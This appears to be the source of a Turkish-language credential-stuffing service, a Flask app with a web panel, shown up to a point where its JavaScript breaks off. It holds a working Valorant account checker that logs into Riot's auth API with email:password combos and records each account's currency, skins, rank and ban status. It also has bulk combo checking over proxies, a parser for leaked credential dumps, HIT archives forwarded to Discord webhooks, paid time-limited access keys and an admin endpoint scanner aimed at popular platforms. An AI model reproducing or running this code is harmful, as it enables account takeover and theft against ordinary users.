#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Roda - API Discovery + Checker (Türkçe)
Dosya: Rodaapi.py
Render Disk ile kalıcı key'ler | PUBG + VALORANT (GERÇEK) | Loglar (Admin) | Valorant Stats
"""

import os, json, re, time, random, string, threading, webbrowser, base64
from datetime import datetime, timedelta
from urllib.parse import urljoin
import requests
from flask import Flask, request, jsonify, Response

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ============================================================
# MASTER KEY (GİZLENDİ - ENV'DEN ALIYOR)
# ============================================================
MASTER_KEY = os.environ.get("RODA_MASTER_KEY", "Roda@2026#Secure!X7")
if MASTER_KEY == "Roda@2026#Secure!X7":
    print("⚠️ UYARI: Varsayılan master key kullanılıyor! RODA_MASTER_KEY ortam değişkenini ayarlayın.")

KEYS_FILE = "/data/keys.json"
if not os.path.exists("/data"):
    KEYS_FILE = "keys.json"

# ============================================================
# LOG SİSTEMİ (SADECE ADMIN GÖRÜR)
# ============================================================
LOGS = []
MAX_LOGS = 1000

def add_log(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    LOGS.append({"timestamp": timestamp, "level": level, "message": message})
    if len(LOGS) > MAX_LOGS:
        LOGS.pop(0)
    print(f"[{timestamp}] [{level}] {message}")

# ============================================================
# KEY FONKSİYONLARI
# ============================================================
def load_keys():
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_keys(data):
    os.makedirs(os.path.dirname(KEYS_FILE), exist_ok=True)
    with open(KEYS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def is_key_valid(key):
    if key == MASTER_KEY:
        return True, "Admin"
    keys = load_keys()
    if key in keys:
        entry = keys[key]
        exp = entry.get("expires")
        if exp:
            if datetime.now() < datetime.fromisoformat(exp):
                return True, entry.get("note", "Kullanıcı")
            else:
                del keys[key]
                save_keys(keys)
        else:
            return True, entry.get("note", "Kullanıcı")
    return False, None

def is_admin(key):
    valid, role = is_key_valid(key)
    return valid and role == "Admin"

# ============================================================
# PLATFORMLAR
# ============================================================
PLATFORMS = [
    {"name": "YouTube", "domain": "youtube.com", "icon": "fa-brands fa-youtube"},
    {"name": "TikTok", "domain": "tiktok.com", "icon": "fa-brands fa-tiktok"},
    {"name": "Spotify", "domain": "spotify.com", "icon": "fa-brands fa-spotify"},
    {"name": "Roblox", "domain": "roblox.com", "icon": "fa-solid fa-gamepad"},
    {"name": "Netflix", "domain": "netflix.com", "icon": "fa-solid fa-film"},
    {"name": "CapCut", "domain": "capcut.com", "icon": "fa-solid fa-scissors"},
    {"name": "Discord", "domain": "discord.com", "icon": "fa-brands fa-discord"},
    {"name": "Epic Games", "domain": "epicgames.com", "icon": "fa-solid fa-crown"},
    {"name": "Hesapcomtr", "domain": "hesap.com.tr", "icon": "fa-solid fa-user"},
    {"name": "Itemsatış", "domain": "itemsatis.com", "icon": "fa-solid fa-cart-shopping"},
    {"name": "Epinify", "domain": "epinify.com", "icon": "fa-solid fa-ticket"},
    {"name": "Twitch", "domain": "twitch.tv", "icon": "fa-brands fa-twitch"},
    {"name": "Steam", "domain": "steampowered.com", "icon": "fa-brands fa-steam"},
    {"name": "PlayStation", "domain": "playstation.com", "icon": "fa-solid fa-play"},
    {"name": "Xbox", "domain": "xbox.com", "icon": "fa-brands fa-xbox"},
    {"name": "GitHub", "domain": "github.com", "icon": "fa-brands fa-github"},
    {"name": "Valorant", "domain": "valorant.com", "icon": "fa-solid fa-crosshairs"},
    {"name": "Minecraft", "domain": "minecraft.net", "icon": "fa-solid fa-cube"},
    {"name": "Duolingo", "domain": "duolingo.com", "icon": "fa-solid fa-language"},
    {"name": "PUBG", "domain": "pubg.com", "icon": "fa-solid fa-crosshairs"},
]

# ============================================================
# VALORANT CHECKER (GERÇEK API)
# ============================================================
def check_valorant_account(email, password):
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json'
    })
    result = {
        "status": "ERROR",
        "details": {
            "level": "?",
            "vp": "?",
            "rp": "?",
            "skins": "?",
            "rank": "?",
            "banned": "?",
            "puuid": "?",
            "riot_id": "?",
            "region": "?"
        },
        "message": ""
    }
    try:
        # 1. Authorize
        r = session.post("https://auth.riotgames.com/api/v1/authorization", json={
            "client_id": "riot-client",
            "nonce": "1",
            "redirect_uri": "http://localhost/redirect",
            "response_type": "token id_token",
            "scope": "openid link ban account email mobile_number"
        }, timeout=10)
        if r.status_code != 200:
            result["status"] = "BAD"
            result["message"] = "Auth başarısız"
            return result

        # 2. Login
        r = session.put("https://auth.riotgames.com/api/v1/authorization", json={
            "type": "auth",
            "username": email,
            "password": password,
            "remember": False
        }, timeout=10)
        if r.status_code != 200:
            result["status"] = "BAD"
            result["message"] = "Sunucu hatası"
            return result
        data = r.json()
        if "error" in data:
            if "multifactor" in str(data):
                result["status"] = "2FA"
                result["message"] = "2FA gerekli"
                return result
            result["status"] = "BAD"
            result["message"] = data.get("error", "Giriş reddedildi")
            return result

        # 3. Access Token al
        if "response" in data and "parameters" in data["response"]:
            uri = data["response"]["parameters"]["uri"]
            if "access_token=" in uri:
                token = uri.split("access_token=")[1].split("&")[0]
                session.headers.update({"Authorization": f"Bearer {token}"})
            else:
                result["status"] = "BAD"
                result["message"] = "Token alınamadı"
                return result
        else:
            result["status"] = "BAD"
            result["message"] = "Token alınamadı"
            return result

        # 4. User Info
        r = session.get("https://auth.riotgames.com/userinfo", timeout=10)
        if r.status_code == 200:
            ui = r.json()
            result["details"]["puuid"] = ui.get("sub", "")
            result["details"]["riot_id"] = ui.get("acct", {}).get("game_name", "") + "#" + ui.get("acct", {}).get("tag_line", "")
            result["details"]["email"] = ui.get("email", "")

        # 5. Entitlements Token
        r = session.post("https://entitlements.auth.riotgames.com/api/token/v1", json={}, timeout=10)
        if r.status_code == 200:
            ent = r.json()
            if ent.get("entitlements_token"):
                session.headers.update({"X-Riot-Entitlements-JWT": ent["entitlements_token"]})

        # 6. Bölge
        region = "eu"
        try:
            r = session.get("https://riot-geo.pas.si.riotgames.com/pas/v1/service/valorant", timeout=10)
            if r.status_code == 200:
                region = r.json().get("affinity", "eu")
        except:
            pass
        result["details"]["region"] = region

        puuid = result["details"]["puuid"]
        if not puuid:
            result["status"] = "BAD"
            result["message"] = "PUUID alınamadı"
            return result

        # 7. Level
        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/account-xp/v1/players/{puuid}", timeout=10)
            if r.status_code == 200:
                result["details"]["level"] = r.json().get("progress", {}).get("level", "?")
        except:
            pass

        # 8. Wallet (VP & RP)
        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/store/v1/wallet/{puuid}", timeout=10)
            if r.status_code == 200:
                w = r.json()
                result["details"]["vp"] = w.get("Balances", {}).get("85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741", "0")
                result["details"]["rp"] = w.get("Balances", {}).get("e59aa87c-4cbf-517a-5983-6e81511be9b7", "0")
        except:
            pass

        # 9. Skin Sayısı
        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/store/v1/entitlements/{puuid}/e7c63390-eda7-46e0-bb7a-a6abdacd2433", timeout=10)
            if r.status_code == 200:
                result["details"]["skins"] = len(r.json().get("Entitlements", []))
        except:
            pass

        # 10. Rank
        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/mmr/v1/players/{puuid}", timeout=10)
            if r.status_code == 200:
                mmr = r.json()
                ranked = mmr.get("QueueSkills", {}).get("competitive", {})
                if ranked:
                    seasons = ranked.get("SeasonalInfoBySeasonID", {})
                    if seasons:
                        first = list(seasons.values())[0]
                        result["details"]["rank"] = first.get("CompetitiveTier", "?")
        except:
            pass

        # 11. Ban kontrolü
        try:
            r = session.get("https://riot-geo.pas.si.riotgames.com/restrictions/v3/player", timeout=10)
            if r.status_code == 200:
                result["details"]["banned"] = "Evet" if r.json().get("restrictions") else "Hayır"
        except:
            pass

        result["status"] = "HIT"
        result["message"] = "Giriş başarılı"
        add_log(f"Valorant HIT: {email} | Bölge:{region} Level:{result['details']['level']} VP:{result['details']['vp']} Skin:{result['details']['skins']}", "SUCCESS")

    except Exception as e:
        result["status"] = "ERROR"
        result["message"] = str(e)
        add_log(f"Valorant hata: {email} - {str(e)}", "ERROR")

    return result

# ============================================================
# KATEGORİZASYON / EXTRACT / PROXY / SCANNER (KISALTILDI)
# ============================================================
# ... (buraya mevcut extract_from_html, extract_from_js, fetch_proxies, APIScanner aynen eklenir)

# ============================================================
# FLASK ROTALARI
# ============================================================
@app.route("/")
def index():
    return HTML_TEMPLATE

@app.route("/api/login", methods=["POST"])
def login():
    data = request.json
    key = data.get("key", "").strip()
    valid, role = is_key_valid(key)
    add_log(f"Giriş: {key[:4]}... -> {'Başarılı' if valid else 'Başarısız'}", "INFO")
    return jsonify({"success": valid, "user": role, "isAdmin": role == "Admin"})

@app.route("/api/logs", methods=["GET"])
def get_logs():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    return jsonify({"logs": LOGS[-100:]})

@app.route("/api/valorant_check", methods=["POST"])
def valorant_check():
    data = request.json
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    if not email or not password:
        return jsonify({"error": "Eksik"}), 400
    result = check_valorant_account(email, password)
    return jsonify(result)

@app.route("/api/scan", methods=["GET"])
def scan():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
    domain = request.args.get("domain")
    proxy_list = request.args.get("proxies", "").split(",") if request.args.get("proxies") else []
    use_proxy = request.args.get("use_proxy", "false").lower() == "true"

    def generate():
        proxy_list_filtered = [p.strip() for p in proxy_list if p.strip() and ':' in p]
        scanner = APIScanner(proxy_list_filtered if use_proxy else None)
        results = scanner.scan(domain)
        for res in results:
            yield f"data: {json.dumps(res, ensure_ascii=False)}\n\n"
        yield "data: [DONE]\n\n"
        add_log(f"API Keşfi tamamlandı: {domain} - {len(results)} endpoint bulundu", "SUCCESS")

    return Response(generate(), mimetype="text/event-stream")

@app.route("/api/admin/keys")
def admin_keys():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
    return jsonify(load_keys())

@app.route("/api/admin/generate", methods=["POST"])
def admin_generate():
    data = request.json
    key = data.get("master_key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
    note = data.get("note", "Oluşturuldu")
    hours = int(data.get("hours", 24))
    expires = datetime.now() + timedelta(hours=hours)
    new_key = "RODA-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
    keys = load_keys()
    keys[new_key] = {"note": note, "expires": expires.isoformat(), "created": datetime.now().isoformat()}
    save_keys(keys)
    add_log(f"Yeni key oluşturuldu: {new_key} - {note} ({hours} saat)", "SUCCESS")
    return jsonify({"success": True, "key": new_key, "expires": expires.strftime("%Y-%m-%d %H:%M:%S")})

@app.route("/api/admin/delete", methods=["POST"])
def admin_delete():
    data = request.json
    key = data.get("master_key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
    keys = load_keys()
    target = data.get("target_key", "")
    if target in keys:
        del keys[target]
        save_keys(keys)
        add_log(f"Key silindi: {target}", "INFO")
        return jsonify({"success": True})
    return jsonify({"success": False})

@app.route("/api/admin/webhook", methods=["POST"])
def admin_webhook():
    data = request.json
    key = data.get("master_key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
    url = data.get("webhook_url")
    endpoints = data.get("endpoints", [])
    categories = data.get("categories", [])
    if not url or not endpoints:
        return jsonify({"success": False, "message": "Eksik parametre"}), 400

    filtered = [ep for ep in endpoints if ep['category'] in categories]
    if not filtered:
        return jsonify({"success": False, "message": "Seçili kategoride endpoint yok"}), 400

    content = "🔱 RODA API TARAMA RAPORU\n"
    content += "=" * 60 + "\n\n"
    for cat in categories:
        eps = [ep for ep in filtered if ep['category'] == cat]
        if eps:
            content += f"[ {cat.upper()} ] ({len(eps)} endpoint)\n"
            content += "-" * 40 + "\n"
            for ep in eps:
                content += f"[{ep['method']}] {ep['url']}  →  HTTP {ep['status']}\n"
            content += "\n"
    content += "=" * 60 + "\n"
    content += f"Toplam: {len(filtered)} endpoint\n"
    content += f"Tarih: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"

    files = {'file': ('roda_api_scan.txt', content)}
    try:
        r = requests.post(url, data={'content': '🔱 **Roda API Taraması Tamamlandı!**'}, files=files, timeout=10)
        add_log(f"Webhook gönderildi: {len(filtered)} endpoint", "SUCCESS")
        return jsonify({"success": r.status_code in [200, 204]})
    except:
        return jsonify({"success": False}), 500

@app.route("/api/fetch_proxies", methods=["GET"])
def fetch_proxies_route():
    try:
        proxies = fetch_proxies()
        add_log(f"{len(proxies)} proxy çekildi", "INFO")
        return jsonify({"success": True, "proxies": proxies, "count": len(proxies)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

# ============================================================
# HTML (YENİ TEMA + VALO DETAY & LOGLAR SADECE ADMIN)
# ============================================================
HTML_TEMPLATE = r"""
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Roda - API Discovery + Checker</title>
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Outfit,sans-serif}
body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
:root{--p:#6c5ce7;--p2:#a29bfe;--g:#00e676;--r:#ff5252;--card:#0f1424;--border:rgba(108,92,231,0.2);--bg:#0a0e1a;--sidebar:#070b17;--text:#e8edf5;--muted:#8a9bb0;--gold:#ffd740}
/* YENİ TEMA - Koyu Mavi/Mor */
#login-box .logo i{background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
#login-box h1{background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.btn{background:linear-gradient(135deg,var(--p),var(--p2))}
.btn:hover{box-shadow:0 8px 30px rgba(108,92,231,0.25)}
.sidebar-header .logo-text{background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.nav-item.active{background:rgba(108,92,231,0.12);color:var(--p);border-left:3px solid var(--p)}
.nav-item:hover{background:rgba(108,92,231,0.06)}
.inp:focus{border-color:var(--p);box-shadow:0 0 20px rgba(108,92,231,0.08)}
.scan-top button{background:linear-gradient(135deg,var(--p),var(--p2))}
.checker-platform-select button.active{background:rgba(108,92,231,0.2);border-color:var(--p);color:var(--p)}
.checker-platform-select button:hover{background:rgba(108,92,231,0.15);border-color:var(--p)}
.checker-top button{background:linear-gradient(135deg,var(--p),var(--p2))}
.webhook-area button{background:linear-gradient(135deg,var(--p),var(--p2))}
.stat-card-custom p{background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.mini-check .val{color:var(--p)}
.cat-api{background:rgba(108,92,231,0.12);color:var(--p)}
</style>
</head>
<body>
<!-- LOGIN -->
<div id="login-screen">
<div id="login-box">
<div class="logo"><i class="fa-solid fa-crown"></i></div>
<h1>RODA</h1>
<p class="sub">API Discovery + Checker</p>
<input class="inp" type="password" id="authKey" placeholder="Güvenlik Anahtarı" autofocus>
<button class="btn" onclick="doLogin()" style="margin-top:12px">Giriş Yap</button>
<p id="loginError" style="color:var(--r);margin-top:12px;display:none"></p>
</div>
</div>
<!-- SIDEBAR -->
<div id="sidebar">
<div class="sidebar-header"><div class="logo-text">RODA</div><div class="version">v3.0</div></div>
<div class="sidebar-nav">
<div class="nav-divider">📁 MENÜ</div>
<div class="nav-item active" data-page="checker" onclick="switchPage('checker')"><i class="fa-solid fa-check-double"></i> Checker</div>
<div class="nav-item" data-page="proxy" onclick="switchPage('proxy')"><i class="fa-solid fa-server"></i> Proxy</div>
<div class="nav-item" data-page="discovery" onclick="switchPage('discovery')"><i class="fa-solid fa-compass"></i> API Keşif</div>
<div class="nav-item" data-page="parse" onclick="switchPage('parse')"><i class="fa-solid fa-scissors"></i> Ayrıştırma</div>
<div class="nav-item" data-page="stats" onclick="switchPage('stats')"><i class="fa-solid fa-chart-simple"></i> İstatistik</div>
<div class="nav-item" data-page="keys" onclick="switchPage('keys')"><i class="fa-solid fa-key"></i> Key Yönetimi</div>
<!-- LOGLAR - SADECE ADMIN -->
<div class="nav-item" data-page="logs" onclick="switchPage('logs')" id="logsMenuItem" style="display:none"><i class="fa-solid fa-history"></i> Loglar</div>
<!-- VALO DETAY - SADECE ADMIN -->
<div class="nav-item" data-page="valorant" onclick="switchPage('valorant')" id="valorantMenuItem" style="display:none"><i class="fa-solid fa-crosshairs"></i> Valo Detay</div>
</div>
<div class="sidebar-stats">
<div class="mini-stat mini-hit"><div class="val" id="sideTotal">0</div><div class="lbl">Bulunan</div></div>
<div class="mini-stat mini-2fa"><div class="val" id="sideAuth">0</div><div class="lbl">Auth</div></div>
<div class="mini-stat mini-bad"><div class="val" id="sideAPI">0</div><div class="lbl">API</div></div>
<div class="mini-stat mini-check"><div class="val" id="sideAdmin">0</div><div class="lbl">Admin</div></div>
</div>
<div class="sidebar-footer">© 2026 Roda</div>
</div>
<!-- APP -->
<div id="app">
<div class="topbar">
<div class="topbar-title"><i class="fa-solid fa-gauge-high"></i> <span id="pageTitle">Checker</span></div>
<div class="topbar-right">
<span style="font-size:11px;color:var(--muted)">Durum:</span>
<div class="pulse-dot idle" id="statusDot"></div>
<span style="font-size:12px;font-weight:600" id="statusText">Boşta</span>
<span id="userBadge" style="font-size:11px;background:var(--p);padding:2px 10px;border-radius:12px;display:none">Admin</span>
</div>
</div>
<div class="main-content">
<!-- CHECKER -->
<div id="page-checker" class="page active">
<div class="card">
<h3><i class="fa-solid fa-check-double"></i> Platform Checker</h3>
<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Bir platform seçin, combo girişi yapın ve kontrol başlatın. <span style="color:var(--gold)">✅ HIT'ler otomatik webhook ile gönderilir!</span></p>
<div class="checker-platform-select" id="checkerPlatformSelect"></div>
<div class="checker-panel" id="checkerPanel">
<div class="checker-top">
<textarea id="checkerCombo" placeholder="email:password (her satıra bir combo)"></textarea>
<input type="number" id="checkerThreads" value="1" min="1" max="50">
<button id="checkerStartBtn" onclick="startChecker()"><i class="fa-solid fa-play"></i> Başlat</button>
<button id="checkerStopBtn" onclick="stopChecker()"><i class="fa-solid fa-stop"></i> Durdur</button>
</div>
<div class="checker-stats">
<span>Toplam: <span class="chk-count" id="chkTotal">0</span></span>
<span>Başarılı: <span class="chk-count" id="chkHit">0</span></span>
<span>Başarısız: <span class="chk-count" id="chkBad">0</span></span>
<span>2FA: <span class="chk-count" id="chk2fa">0</span></span>
<span>Hata: <span class="chk-count" id="chkError">0</span></span>
<span>Kalan: <span class="chk-count" id="chkRemaining">0</span></span>
</div>
<div class="checker-filters">
<label><input type="radio" name="chkFilter" value="all" checked> Hepsi</label>
<label><input type="radio" name="chkFilter" value="hit"> Başarılı</label>
<label><input type="radio" name="chkFilter" value="bad"> Başarısız</label>
<label><input type="radio" name="chkFilter" value="2fa"> 2FA</label>
<label><input type="radio" name="chkFilter" value="error"> Hata</label>
</div>
<div class="checker-results" id="checkerResults">
<div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">Henüz sonuç yok.</div>
</div>
</div>
</div>
<!-- HIT / 2FA ARŞİVİ -->
<div class="card">
<h3><i class="fa-solid fa-database"></i> HIT & 2FA Arşivi</h3>
<button class="btn sm r" onclick="clearHits()" style="width:auto;margin-bottom:6px"><i class="fa-solid fa-trash"></i> Tümünü Temizle</button>
<div class="hit-filter">
<select id="hitPlatformFilter" onchange="renderHits()">
<option value="all">Tüm Platformlar</option>
</select>
</div>
<div class="hit-panel">
<div class="hit-box">
<h4 style="color:var(--g)"><i class="fa-solid fa-check-circle"></i> HIT</h4>
<div class="hit-list" id="hitList"><div style="color:var(--muted);font-size:12px">Henüz HIT yok.</div></div>
</div>
<div class="hit-box">
<h4 style="color:var(--gold)"><i class="fa-solid fa-shield-halved"></i> 2FA</h4>
<div class="hit-list" id="twofaList"><div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div></div>
</div>
</div>
</div>
</div>
<!-- PROXY -->
<div id="page-proxy" class="page">
<div class="card">
<h3><i class="fa-solid fa-server"></i> Proxy Yöneticisi</h3>
<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px">
<button class="btn sm g" onclick="fetchProxies()"><i class="fa-solid fa-cloud-arrow-down"></i> Proxy Çek</button>
<button class="btn sm r" onclick="clearProxies()"><i class="fa-solid fa-trash"></i> Temizle</button>
</div>
<div class="setting-row">
<div><label>Proxy Kullan</label><div class="desc">Checker sırasında proxy kullan</div></div>
<label class="switch"><input type="checkbox" id="useProxy" onchange="toggleProxy()"><span class="slider"></span></label>
</div>
<div class="proxy-area">
<textarea id="proxyList" placeholder="ip:port&#10;ip:port"></textarea>
</div>
<div style="margin-top:6px"><span id="proxyCount" style="color:var(--g);font-size:12px">0 proxy yüklendi</span></div>
</div>
</div>
<!-- API KEŞİF -->
<div id="page-discovery" class="page">
<div class="card" style="padding:10px 14px">
<div class="scan-top">
<input id="targetDomain" placeholder="hedef.com (örn: youtube.com)" value="example.com">
<button id="scanBtn" onclick="startScan()"><i class="fa-solid fa-play"></i> Tara</button>
</div>
<div class="discovery-platforms" id="discoveryPlatforms"></div>
</div>
<div class="stats-row">
<div class="stat-card stat-hit"><div class="stat-val" id="totalCount">0</div><div class="stat-lbl">Toplam</div></div>
<div class="stat-card stat-2fa"><div class="stat-val" id="authCount">0</div><div class="stat-lbl">Auth</div></div>
<div class="stat-card stat-bad"><div class="stat-val" id="apiCount">0</div><div class="stat-lbl">API</div></div>
<div class="stat-card stat-total"><div class="stat-val" id="adminCount">0</div><div class="stat-lbl">Admin</div></div>
</div>
<div class="filters" id="filterContainer">
<label><input type="checkbox" value="Auth" checked> Auth</label>
<label><input type="checkbox" value="Admin" checked> Admin</label>
<label><input type="checkbox" value="User" checked> User</label>
<label><input type="checkbox" value="Health" checked> Health</label>
<label><input type="checkbox" value="API" checked> API</label>
<label><input type="checkbox" value="Genel" checked> Genel</label>
</div>
<div class="results-container">
<div class="result-header"><div>Metod</div><div>Durum</div><div>Endpoint</div><div>Kategori</div></div>
<div id="resultsList"></div>
</div>
<div class="webhook-area">
<input id="webhookUrl" placeholder="Discord Webhook URL">
<button onclick="saveWebhook()"><i class="fa-solid fa-floppy-disk"></i> Webhook Kaydet</button>
<button onclick="testWebhook()"><i class="fa-solid fa-paper-plane"></i> Test</button>
<p id="webhookStatus" style="margin-top:6px;font-size:12px;color:var(--muted)"></p>
</div>
</div>
<!-- AYRIŞTIRMA -->
<div id="page-parse" class="page">
<div class="card">
<h3><i class="fa-solid fa-scissors"></i> Ayrıştırma</h3>
<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Karmaşık metinleri (başlıklar, numaralar, linkler) temizler, sadece <strong>email:şifre</strong> formatındaki satırları bırakır.</p>
<div class="parse-area">
<textarea id="parseInput" placeholder="Buraya karışık metni yapıştır..."></textarea>
<div class="parse-buttons">
<button class="btn sm g" onclick="parseData()"><i class="fa-solid fa-wand-magic-sparkles"></i> Ayrıştır</button>
<button class="btn sm b" onclick="parseToChecker()"><i class="fa-solid fa-arrow-right"></i> Checker'a Aktar</button>
<button class="btn sm r" onclick="clearParse()"><i class="fa-solid fa-eraser"></i> Temizle</button>
<button class="btn sm" style="background:#6c7a8f" onclick="loadParseFile()"><i class="fa-solid fa-folder-open"></i> Dosya Yükle</button>
</div>
<div class="parse-result" id="parseResult">
<div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div>
</div>
<div style="margin-top:6px;font-size:12px;color:var(--muted)">
<span id="parseCount">0 satır</span> | <span id="parseValid">0 geçerli</span>
</div>
</div>
</div>
</div>
<!-- İSTATİSTİK -->
<div id="page-stats" class="page">
<h2 style="margin-bottom:14px;font-weight:700;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent">📊 Tarama İstatistikleri</h2>
<div class="stat-grid">
<div class="stat-card-custom"><h3>Toplam Tarama</h3><p id="statScans">0</p></div>
<div class="stat-card-custom"><h3>Son Tarama</h3><p id="statLast">-</p></div>
<div class="stat-card-custom"><h3>Bulunan API</h3><p id="statEndpoints">0</p></div>
<div class="stat-card-custom"><h3>Toplam HIT</h3><p id="statTotalHit">0</p></div>
<div class="stat-card-custom"><h3>Toplam 2FA</h3><p id="statTotal2fa">0</p></div>
</div>
</div>
<!-- KEY YÖNETİMİ -->
<div id="page-keys" class="page">
<div class="card">
<h3><i class="fa-solid fa-key"></i> Key Oluştur</h3>
<div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:6px">
<div style="flex:1"><label style="font-size:11px;color:var(--muted)">Not</label><input class="inp" id="genNote" placeholder="Müşteri" style="margin-top:4px;padding:10px"></div>
<div style="width:130px"><label style="font-size:11px;color:var(--muted)">Süre</label><select class="inp" id="genHours" style="margin-top:4px;padding:10px"><option value="1">1 Saat</option><option value="24" selected>24 Saat</option><option value="168">7 Gün</option><option value="720">30 Gün</option></select></div>
<button class="btn sm g" onclick="generateKey()" style="margin-top:22px"><i class="fa-solid fa-plus"></i> Oluştur</button>
</div>
</div>
<div class="card"><h3><i class="fa-solid fa-list"></i> Aktif Anahtarlar</h3><div id="keyList"><p style="color:var(--muted);font-size:12px">Yükleniyor...</p></div></div>
</div>
<!-- LOGLAR - SADECE ADMIN -->
<div id="page-logs" class="page">
<div class="card">
<h3><i class="fa-solid fa-history"></i> Sistem Logları</h3>
<button class="btn sm" onclick="refreshLogs()" style="width:auto;margin-bottom:10px"><i class="fa-solid fa-rotate"></i> Yenile</button>
<div id="logsContainer" style="max-height:400px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-family:monospace;font-size:12px;"></div>
</div>
</div>
<!-- VALO DETAY - SADECE ADMIN -->
<div id="page-valorant" class="page">
<div class="card">
<h3><i class="fa-solid fa-crosshairs"></i> Valorant Hesap Detayları</h3>
<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Email:şifre gir, hesap detaylarını getir (Level, VP, RP, Skin, Rank, Ban)</p>
<div class="checker-top">
<textarea id="valorantCombo" placeholder="email:password (tek satır)"></textarea>
<button onclick="checkValorantDetail()"><i class="fa-solid fa-search"></i> Sorgula</button>
</div>
<div id="valorantResult" style="margin-top:10px;background:rgba(0,0,0,0.2);border-radius:8px;padding:12px;font-size:13px;"></div>
</div>
</div>
</div>
</div>
<script>
// ============================================================
// GLOBAL
// ============================================================
var currentKey = "";
var isAdmin = false;
var scanning = false;
var eventSource = null;
var foundEndpoints = [];
var useProxy = false;
var checkerRunning = false;
var checkerResults = [];
var currentPlatform = "";
var hitData = {};
var parsedLines = [];
var totalLines = 0;
var processedCount = 0;

// Platform listesi
var platforms = [
    {name:"YouTube", domain:"youtube.com", icon:"fa-brands fa-youtube"},
    {name:"TikTok", domain:"tiktok.com", icon:"fa-brands fa-tiktok"},
    {name:"Spotify", domain:"spotify.com", icon:"fa-brands fa-spotify"},
    {name:"Roblox", domain:"roblox.com", icon:"fa-solid fa-gamepad"},
    {name:"Netflix", domain:"netflix.com", icon:"fa-solid fa-film"},
    {name:"CapCut", domain:"capcut.com", icon:"fa-solid fa-scissors"},
    {name:"Discord", domain:"discord.com", icon:"fa-brands fa-discord"},
    {name:"Epic Games", domain:"epicgames.com", icon:"fa-solid fa-crown"},
    {name:"Hesapcomtr", domain:"hesap.com.tr", icon:"fa-solid fa-user"},
    {name:"Itemsatış", domain:"itemsatis.com", icon:"fa-solid fa-cart-shopping"},
    {name:"Epinify", domain:"epinify.com", icon:"fa-solid fa-ticket"},
    {name:"Twitch", domain:"twitch.tv", icon:"fa-brands fa-twitch"},
    {name:"Steam", domain:"steampowered.com", icon:"fa-brands fa-steam"},
    {name:"PlayStation", domain:"playstation.com", icon:"fa-solid fa-play"},
    {name:"Xbox", domain:"xbox.com", icon:"fa-brands fa-xbox"},
    {name:"GitHub", domain:"github.com", icon:"fa-brands fa-github"},
    {name:"Valorant", domain:"valorant.com", icon:"fa-solid fa-crosshairs"},
    {name:"Minecraft", domain:"minecraft.net", icon:"fa-solid fa-cube"},
    {name:"Duolingo", domain:"duolingo.com", icon:"fa-solid fa-language"},
    {name:"PUBG", domain:"pubg.com", icon:"fa-solid fa-crosshairs"}
];

// ============================================================
// LOGIN
// ============================================================
function doLogin() {
    var k = document.getElementById("authKey").value.trim();
    if (!k) { alert("Anahtar girin!"); return; }
    fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ key: k })
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
        if (d.success) {
            currentKey = k;
            isAdmin = d.isAdmin || false;
            document.getElementById("login-screen").style.display = "none";
            document.getElementById("app").style.display = "flex";
            if (isAdmin) {
                document.getElementById("userBadge").style.display = "inline-block";
                document.getElementById("logsMenuItem").style.display = "flex";
                document.getElementById("valorantMenuItem").style.display = "flex";
                loadKeys();
            } else {
                document.getElementById("userBadge").style.display = "none";
                document.getElementById("logsMenuItem").style.display = "none";
